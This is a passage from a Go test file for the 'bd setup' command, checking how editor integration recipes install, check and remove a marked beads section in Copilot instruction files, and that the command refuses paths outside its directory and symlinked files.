			{name: "path through a link inside", recipe: "lint", toml: "[recipes.lint]\npath = \"in/lint.md\"\n", file: "sub/lint.md",
				links: map[string]string{"in": "sub"}},
			{name: "windsurf override", recipe: "windsurf", toml: "[recipes.windsurf]\npath = \"rules/beads.md\"\n", file: "rules/beads.md"},
			{name: "built-in windsurf", recipe: "windsurf", file: ".windsurf/rules/beads.md"},
		} {
			t.Run(tt.name, func(t *testing.T) {
				ws, _ := workspace(t, tt.toml, tt.links)
				file := filepath.Join(ws, filepath.FromSlash(tt.file))
				for _, mode := range []struct {
					name   string
					flag   *bool
					exists bool
				}{{"install", nil, true}, {"--check", &setupCheck, true}, {"--remove", &setupRemove, false}} {
					resetSetupGlobals(t)
					if mode.flag != nil {
						*mode.flag = true
					}
					var err error
					_, stderr := captureStdio(t, func() { err = runRecipe(tt.recipe) })
					if err != nil || stderr != "" {
						t.Errorf("bd setup %s %s: %v, stderr %q", tt.recipe, mode.name, err, stderr)
					}
					if _, err := os.Stat(file); (err == nil) != mode.exists {
						t.Errorf("after bd setup %s %s, %s exists = %v, want %v", tt.recipe, mode.name, tt.file, err == nil, mode.exists)
					}
				}
			})
		}
	})
}

// TestAddRecipe_RefusesPathOutsideDir pins that bd setup --add does not save
// a recipe whose path bd setup would refuse (recipes.PathInside), and saves
// an ordinary one, and one with no path, as before.
func TestAddRecipe_RefusesPathOutsideDir(t *testing.T) {
	ws := t.TempDir()
	beadsDir := filepath.Join(ws, ".beads")
	if err := os.MkdirAll(beadsDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Chdir(ws)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	for _, path := range []string{filepath.Join("..", "victim.md"), filepath.Join(ws, "victim.md")} {
		err := addRecipe("myeditor", path)
		if want := "recipe path " + recipeRefusalWord(path) + " is not inside the directory bd setup runs in; " +
			"a .beads/recipes.toml recipe can only name a relative path with no '..' or symbolic link leading out of the directory bd setup runs in, and no dangling or looping link along it"; err == nil || err.Error() != want {
			t.Errorf("bd setup --add myeditor %q = %v; want %q", path, err, want)
		}
		if _, err := os.Stat(filepath.Join(beadsDir, "recipes.toml")); !os.IsNotExist(err) {
			t.Fatalf("bd setup --add myeditor %q wrote recipes.toml: %v", path, err)
		}
	}
	for _, path := range []string{".myeditor/rules.md", ""} {
		if out := captureStdout(t, func() error { return addRecipe("myeditor", path) }); !strings.HasPrefix(out, "✓ Added recipe 'myeditor'") {
			t.Errorf("bd setup --add myeditor %q printed %q", path, out)
		}
		saved, err := recipes.LoadUserRecipes(beadsDir)
		if err != nil || saved["myeditor"].Path != path {
			t.Errorf("bd setup --add myeditor %q saved %+v, %v", path, saved["myeditor"], err)
		}
	}
}

// bd setup copilot must not clobber a repository's own
// .github/copilot-instructions.md: the user's content stays, with the beads
// guidance added alongside it (GH#7431).
func TestRunRecipe_CopilotKeepsExistingInstructions(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
	if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
		t.Fatal(err)
	}
	const userContent = "# Team Copilot rules\n\nAlways write table-driven tests.\n"
	if err := os.WriteFile(instructions, []byte(userContent), 0o644); err != nil {
		t.Fatal(err)
	}

	_ = captureStdout(t, func() error {
		return runRecipe("copilot")
	})

	got, err := os.ReadFile(instructions)
	if err != nil {
		t.Fatalf("read instructions: %v", err)
	}
	if !strings.Contains(string(got), "Always write table-driven tests.") {
		t.Fatalf("bd setup copilot overwrote the user's copilot-instructions.md; got:\n%s", got)
	}
	// The user's bytes stay a prefix, and exactly one marked section with the
	// current template follows them.
	want := userContent + "\n" +
		"<!-- BEGIN BEADS INTEGRATION -->\n" +
		recipes.CopilotInstructionsTemplate +
		"<!-- END BEADS INTEGRATION -->\n"
	if string(got) != want {
		t.Fatalf("instructions =\n%q\nwant\n%q", got, want)
	}
	if n := strings.Count(string(got), "<!-- BEGIN BEADS INTEGRATION"); n != 1 {
		t.Fatalf("%d beads sections in instructions; want 1:\n%s", n, got)
	}
	if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")); err != nil {
		t.Fatalf("expected the beads-owned plugin manifest: %v", err)
	}
}

// An existing beads section is replaced in place — the user's text before
// and after it is untouched — and a second run leaves the file
// byte-identical without rewriting it (GH#7431).
func TestRunRecipe_CopilotReplacesSectionInPlace(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
	if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
		t.Fatal(err)
	}
	const before = "# Team rules\n\nWrite table-driven tests.\n\n"
	const after = "## Legacy notes\n\nKept from last year.\n"
	stale := before +
		"<!-- BEGIN BEADS INTEGRATION -->\n" +
		"# Old beads guidance\n" +
		"<!-- END BEADS INTEGRATION -->\n" +
		after
	if err := os.WriteFile(instructions, []byte(stale), 0o644); err != nil {
		t.Fatal(err)
	}

	_ = captureStdout(t, func() error {
		return runRecipe("copilot")
	})

	got, err := os.ReadFile(instructions)
	if err != nil {
		t.Fatal(err)
	}
	want := before +
		"<!-- BEGIN BEADS INTEGRATION -->\n" +
		recipes.CopilotInstructionsTemplate +
		"<!-- END BEADS INTEGRATION -->\n" +
		after
	if string(got) != want {
		t.Fatalf("instructions =\n%q\nwant\n%q", got, want)
	}
	if n := strings.Count(string(got), "<!-- BEGIN BEADS INTEGRATION"); n != 1 {
		t.Fatalf("%d beads sections after update; want 1:\n%s", n, got)
	}
	// The current template appears exactly once: the stale guidance is gone,
	// not duplicated.
	if n := strings.Count(string(got), "## Context Loading"); n != 1 {
		t.Fatalf("current template appears %d times; want 1:\n%s", n, got)
	}

	// A second run changes nothing and does not rewrite the file.
	age := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(instructions, age, age); err != nil {
		t.Fatal(err)
	}
	_ = captureStdout(t, func() error {
		return runRecipe("copilot")
	})
	info, err := os.Stat(instructions)
	if err != nil {
		t.Fatal(err)
	}
	if !info.ModTime().Equal(age) {
		t.Fatal("second run rewrote the instructions file")
	}
	gotAgain, err := os.ReadFile(instructions)
	if err != nil || string(gotAgain) != want {
		t.Fatalf("second run changed the file:\n%q, %v\nwant\n%q", gotAgain, err, want)
	}
}

// --check cannot call an integration installed off a file bd owns no part
// of: an instructions file holding only the user's content is a missing
// beads section, reported non-zero with the path named and a setup remedy,
// and neither file is modified (GH#7431).
func TestRunRecipe_CopilotCheckRequiresSection(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	// The beads-owned manifest is installed; the shared instructions file
	// holds only user content.
	manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
	if err := os.MkdirAll(filepath.Dir(manifest), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(manifest, []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
	if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
		t.Fatal(err)
	}
	const userContent = "# Team Copilot rules\n"
	if err := os.WriteFile(instructions, []byte(userContent), 0o644); err != nil {
		t.Fatal(err)
	}

	setupCheck = true
	t.Cleanup(func() { setupCheck = false })

	var checkErr error
	out := captureStdout(t, func() error {
		checkErr = runRecipe("copilot")
		return nil
	})
	if checkErr == nil {
		t.Fatal("bd setup copilot --check accepted an instructions file with no beads section")
	}
	if !strings.Contains(out, "Missing beads section: .github/copilot-instructions.md") {
		t.Fatalf("missing-section diagnostic not found in:\n%s", out)
	}
	if !strings.Contains(out, "Run: bd setup copilot") {
		t.Fatalf("setup remedy not found in:\n%s", out)
	}

	// Neither file moved.
	gotManifest, err := os.ReadFile(manifest)
	if err != nil || string(gotManifest) != "{}\n" {
		t.Fatalf("check touched the manifest: %q, %v", gotManifest, err)
	}
	gotInstructions, err := os.ReadFile(instructions)
	if err != nil || string(gotInstructions) != userContent {
		t.Fatalf("check touched the instructions file: %q, %v", gotInstructions, err)
	}
}

// --remove takes bd's section out of a shared instructions file, not the
// file: the user's text stays — whitespace around the section following the
// section-removal rules — while the beads-owned manifest goes (GH#7431).
func TestRunRecipe_CopilotRemoveKeepsUserInstructions(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
	if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
		t.Fatal(err)
	}
	const userBefore = "# Team rules\n\nWrite table-driven tests.\n"
	const userAfter = "## Legacy notes\n\nKept from last year.\n"
	installed := userBefore + "\n" +
		"<!-- BEGIN BEADS INTEGRATION -->\n" +
		recipes.CopilotInstructionsTemplate +
		"<!-- END BEADS INTEGRATION -->\n" +
		userAfter
	if err := os.WriteFile(instructions, []byte(installed), 0o644); err != nil {
		t.Fatal(err)
	}
	_ = captureStdout(t, func() error {
		return runRecipe("copilot")
	})
	manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
	if _, err := os.Stat(manifest); err != nil {
		t.Fatalf("expected the beads-owned manifest: %v", err)
	}

	setupRemove = true
	t.Cleanup(func() { setupRemove = false })
	out := captureStdout(t, func() error {
		return runRecipe("copilot")
	})

	got, err := os.ReadFile(instructions)
	if err != nil {
		t.Fatalf("bd setup copilot --remove deleted the user's instructions file: %v", err)
	}
	// The section and the blank lines that set it off are gone; the user's
	// text is rejoined with one blank line, per the section-removal rules.
	want := "# Team rules\n\nWrite table-driven tests.\n\n## Legacy notes\n\nKept from last year.\n"
	if string(got) != want {
		t.Fatalf("instructions =\n%q\nwant\n%q", got, want)
	}
	if strings.Contains(string(got), "BEADS INTEGRATION") {
		t.Fatalf("markers survived --remove:\n%s", got)
	}
	if !strings.Contains(out, "Kept user content: .github/copilot-instructions.md") {
		t.Fatalf("retained user content not reported in:\n%s", out)
	}
	if _, err := os.Stat(manifest); !os.IsNotExist(err) {
		t.Fatalf("beads-owned manifest survived --remove (stat err %v)", err)
	}
}

// captureStderrForCopilotSetup captures what fn writes to stderr, as the
// backup-lock tests capture theirs.
func captureStderrForCopilotSetup(t *testing.T, fn func()) string {
	t.Helper()

	oldStderr := os.Stderr
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	done := make(chan string, 1)
	go func() {
		var buf []byte
		chunk := make([]byte, 4096)
		for {
			n, err := r.Read(chunk)
			buf = append(buf, chunk[:n]...)
			if err != nil {
				done <- string(buf)
				return
			}
		}
	}()
	os.Stderr = w
	fn()
	w.Close()
	os.Stderr = oldStderr
	return <-done
}

// Markers bd cannot own stop an install or a --remove before either recipe
// path is touched: the refusal names the file, and neither the instructions
// file nor the manifest changes around it (GH#7431).
func TestRunRecipe_CopilotMalformedRefusedBeforeMutating(t *testing.T) {
	for _, mode := range []struct {
		name   string
		remove bool
	}{
		{name: "install", remove: false},
		{name: "remove", remove: true},
	} {
		t.Run(mode.name, func(t *testing.T) {
			tmpDir := t.TempDir()

			t.Chdir(tmpDir)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			resetSetupGlobals(t)

			instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
			if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
				t.Fatal(err)
			}
			// A dangling BEGIN marker: whose span cannot be named.
			const malformed = "intro\n<!-- BEGIN BEADS INTEGRATION -->\nbody\n"
			if err := os.WriteFile(instructions, []byte(malformed), 0o644); err != nil {
				t.Fatal(err)
			}
			manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
			if mode.remove {
				if err := os.MkdirAll(filepath.Dir(manifest), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(manifest, []byte("{}\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}

			setupRemove = mode.remove
			t.Cleanup(func() { setupRemove = false })

			var runErr error
			stderr := captureStderrForCopilotSetup(t, func() {
				_ = captureStdout(t, func() error {
					runErr = runRecipe("copilot")
					return nil
				})
			})
			if runErr == nil {
				t.Fatalf("bd setup copilot (%s) accepted markers it cannot own", mode.name)
			}
			if !strings.Contains(stderr, ".github/copilot-instructions.md") {
				t.Fatalf("refusal does not name the file:\n%s", stderr)
			}
			got, err := os.ReadFile(instructions)
			if err != nil || string(got) != malformed {
				t.Fatalf("instructions changed: %q, %v", got, err)
			}
			if mode.remove {
				if _, err := os.Stat(manifest); err != nil {
					t.Fatalf("manifest was removed before the refusal: %v", err)
				}
			} else if _, err := os.Stat(manifest); !os.IsNotExist(err) {
				t.Fatalf("manifest was written before the refusal (stat err %v)", err)
			}
		})
	}
}

// A whole-file install an earlier bd release wrote is still recognized:
// --check passes and setup converts it to one marked section with the
// current template, without duplicating the guidance (GH#7431). The seed
// is the frozen legacy pin, so a later template edit leaves this install
// recognized.
func TestRunRecipe_CopilotLegacyConverted(t *testing.T) {
	tmpDir := t.TempDir()

	t.Chdir(tmpDir)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)

	instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
	if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(instructions, []byte(recipes.CopilotInstructionsLegacy), 0o644); err != nil {
		t.Fatal(err)
	}
	manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
	if err := os.MkdirAll(filepath.Dir(manifest), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(manifest, []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// --check recognizes the legacy install.
	setupCheck = true
	t.Cleanup(func() { setupCheck = false })
	var checkErr error
	_ = captureStdout(t, func() error {
		checkErr = runRecipe("copilot")
		return nil
	})
	if checkErr != nil {
		t.Fatalf("--check refused a recognized legacy install: %v", checkErr)
	}

	// Setup converts it: one marked section, the guidance exactly once.
	setupCheck = false
	_ = captureStdout(t, func() error {
		return runRecipe("copilot")
	})
	got, err := os.ReadFile(instructions)
	if err != nil {
		t.Fatal(err)
	}
	want := "<!-- BEGIN BEADS INTEGRATION -->\n" +
		recipes.CopilotInstructionsTemplate +
		"<!-- END BEADS INTEGRATION -->\n"
	if string(got) != want {
		t.Fatalf("instructions =\n%q\nwant\n%q", got, want)
	}
	if n := strings.Count(string(got), "## Context Loading"); n != 1 {
		t.Fatalf("guidance appears %d times after conversion; want 1:\n%s", n, got)
	}
}

// A shared instructions file that is a symbolic link is refused — before
// either recipe path is touched — by install and --remove alike: managing
// a section in it would mutate whatever the link leads to, and removing it
// would unlink the link. The link, its target and the manifest are
// preserved (GH#7431).
func TestRunRecipe_CopilotRefusesSymlinkedInstructions(t *testing.T) {
	for _, mode := range []struct {
		name   string
		remove bool
	}{
		{name: "install", remove: false},
		{name: "remove", remove: true},
	} {
		t.Run(mode.name, func(t *testing.T) {
			tmpDir := t.TempDir()

			t.Chdir(tmpDir)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			resetSetupGlobals(t)

			const userContent = "# Team Copilot rules\n"
			target := filepath.Join(tmpDir, "real-instructions.md")
			if err := os.WriteFile(target, []byte(userContent), 0o644); err != nil {
				t.Fatal(err)
			}
			instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
			if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(target, instructions); err != nil {
				t.Skipf("symlink: %v", err)
			}
			manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
			if mode.remove {
				if err := os.MkdirAll(filepath.Dir(manifest), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(manifest, []byte("{}\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}

			setupRemove = mode.remove
			t.Cleanup(func() { setupRemove = false })

			var runErr error
			stderr := captureStderrForCopilotSetup(t, func() {
				_ = captureStdout(t, func() error {
					runErr = runRecipe("copilot")
					return nil
				})
			})
			if runErr == nil {
				t.Fatalf("bd setup copilot (%s) accepted a symlinked instructions file", mode.name)
			}
			if !strings.Contains(stderr, ".github/copilot-instructions.md") {
				t.Fatalf("refusal does not name the file:\n%s", stderr)
			}
			info, err := os.Lstat(instructions)
			if err != nil || info.Mode()&os.ModeSymlink == 0 {
				t.Fatalf("the link was removed or replaced (lstat: %+v, %v)", info, err)
			}
			got, err := os.ReadFile(target)
			if err != nil || string(got) != userContent {
				t.Fatalf("the link's target changed: %q, %v", got, err)
			}
			if mode.remove {
				if _, err := os.Stat(manifest); err != nil {
					t.Fatalf("manifest was removed before the refusal: %v", err)
				}
			} else if _, err := os.Stat(manifest); !os.IsNotExist(err) {
				t.Fatalf("manifest was written before the refusal (stat err %v)", err)
			}
		})
	}
}

// A fresh repository: bd setup copilot creates the beads-owned manifest and
// a section-only instructions file, and --remove takes both files and their
// now-empty directories back out, while a directory holding anything else
// stays (GH#7431).
func TestSetupCopilotRemoveOwnedInstructions(t *testing.T) {
	for _, tt := range []struct {
		name        string
		seed        string // instructions file content before install; "missing" for none
		siblingFile bool   // an unrelated file in .github keeps that directory
	}{
		{name: "fresh install", seed: "missing"},
		{name: "whitespace outside the section", seed: "\n"},
		{name: "legacy install", seed: "legacy"},
		{name: "sibling file keeps .github", seed: "missing", siblingFile: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			t.Chdir(tmpDir)
			t.Setenv("BEADS_DIR", "")
			resetSetupResolutionCaches(t)
			resetSetupGlobals(t)

			instructions := filepath.Join(tmpDir, ".github", "copilot-instructions.md")
			if err := os.MkdirAll(filepath.Dir(instructions), 0o755); err != nil {
				t.Fatal(err)
			}
			seed := tt.seed
			if seed == "legacy" {
				seed = recipes.CopilotInstructionsLegacy
			}
			if seed != "missing" {
				if err := os.WriteFile(instructions, []byte(seed), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			if tt.siblingFile {
				if err := os.WriteFile(filepath.Join(tmpDir, ".github", "other.yml"), []byte("on: push\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			}

			_ = captureStdout(t, func() error {
				return runRecipe("copilot")
			})

			manifest := filepath.Join(tmpDir, ".copilot-plugin", "plugin.json")
			for _, path := range []string{manifest, instructions} {
				if _, err := os.Stat(path); err != nil {
					t.Fatalf("install did not create %s: %v", path, err)
				}
			}
			got, err := os.ReadFile(instructions)
			if err != nil {
				t.Fatal(err)
			}
			want := "<!-- BEGIN BEADS INTEGRATION -->\n" +
				recipes.CopilotInstructionsTemplate +
				"<!-- END BEADS INTEGRATION -->\n"
			if tt.seed == "missing" && string(got) != want {
				t.Fatalf("fresh install wrote a section-only instructions file:\n%s\nwant:\n%s", got, want)
			}
			if n := strings.Count(string(got), "<!-- BEGIN BEADS INTEGRATION"); n != 1 {
				t.Fatalf("%d beads sections after install; want 1:\n%s", n, got)
			}

			_ = captureStdout(t, func() error {
				return runRecipe("copilot")
			})
			setupRemove = true
			t.Cleanup(func() { setupRemove = false })
			_ = captureStdout(t, func() error {
				return runRecipe("copilot")
			})

			for _, path := range []string{manifest, instructions} {
				if _, err := os.Stat(path); !os.IsNotExist(err) {
					t.Fatalf("%s still exists after --remove (stat err %v)", path, err)
				}
			}
			if _, err := os.Stat(filepath.Join(tmpDir, ".copilot-plugin")); !os.IsNotExist(err) {
				t.Fatalf("empty .copilot-plugin directory still exists after --remove: %v", err)
			}
			if tt.siblingFile {
				if _, err := os.Stat(filepath.Join(tmpDir, ".github", "other.yml")); err != nil {
					t.Fatalf("unrelated .github file was taken: %v", err)
				}
			} else if _, err := os.Stat(filepath.Join(tmpDir, ".github")); !os.IsNotExist(err) {
				t.Fatalf("empty .github directory still exists after --remove: %v", err)
			}
		})
	}
}
